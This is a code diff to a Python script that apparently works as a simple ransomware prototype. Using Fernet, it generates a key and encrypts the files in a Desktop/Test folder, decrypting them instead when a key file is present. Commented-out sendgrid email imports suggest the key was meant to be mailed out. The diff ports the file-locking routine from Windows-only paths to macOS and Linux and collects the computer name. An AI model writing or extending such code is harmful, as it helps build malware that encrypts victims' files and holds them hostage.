@@ -25,7 +25,15 @@ from cryptography.fernet import Fernet
 # from email.mime.text import MIMEText
 # from sendgrid import SendGridAPIClient
 # from sendgrid.helpers.mail import Mail
+import platform
+import socket
 
+user_os = "Windows"
+path_str = "\\"
+computer_name = platform.node()
+if (platform.system() == "Darwin" or platform.system() == "Linux"):
+    user_os = platform.system()
+    path_str = "/"
 
 def has_onedrive():
     # Check common OneDrive paths
@@ -44,9 +52,9 @@ def has_onedrive():
 
 
 def navigateToDir(directory):
-    location = str(pathlib.Path.home()) + '\\' + directory
+    location = str(pathlib.Path.home()) + path_str + directory
     if has_onedrive():
-        location = str(pathlib.Path.home()) + '\\' +'OneDrive' + '\\' + directory
+        location = str(pathlib.Path.home()) + path_str +'OneDrive' + path_str + directory
 
     print(location)
     try:
@@ -141,12 +149,12 @@ def start_point():
     file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
     if os.path.isfile(file_path):
         print(f"Decrypting with {file_path}")
-        directory = navigateToDir("Desktop\\Test")
+        directory = navigateToDir("Desktop"+ path_str +"Test")
         target = getFiles(directory)
         decrypt(target, file_path)
     else:
         print("Encrypting")
         generateKey()
-        directory = navigateToDir("Desktop\\Test")
+        directory = navigateToDir("Desktop"+ path_str +"Test")
         target = getFiles(directory)
         encrypt(target)
